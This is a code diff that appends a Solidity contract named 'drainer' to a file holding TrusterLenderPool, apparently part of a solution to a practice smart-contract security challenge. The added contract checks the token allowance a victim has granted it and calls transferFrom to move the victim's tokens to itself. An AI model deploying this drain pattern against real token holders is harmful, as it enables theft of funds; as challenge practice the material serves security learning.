@@ -37,3 +37,26 @@ contract TrusterLenderPool is ReentrancyGuard {
         return true;
     }
 }
+
+contract drainer
+{
+    ERC20 public tok;
+    address public vic;
+    
+    function init (address adr, address _vic) public
+    {
+        tok = ERC20(adr);
+        vic = _vic;
+    }
+
+    function chec() public returns(uint)
+    {
+        address x=address(this);
+        return tok.allowance(vic,x);
+    }
+
+    function drain(uint amount) public 
+    {
+        tok.transferFrom(vic, address(this), amount);
+    }
+}
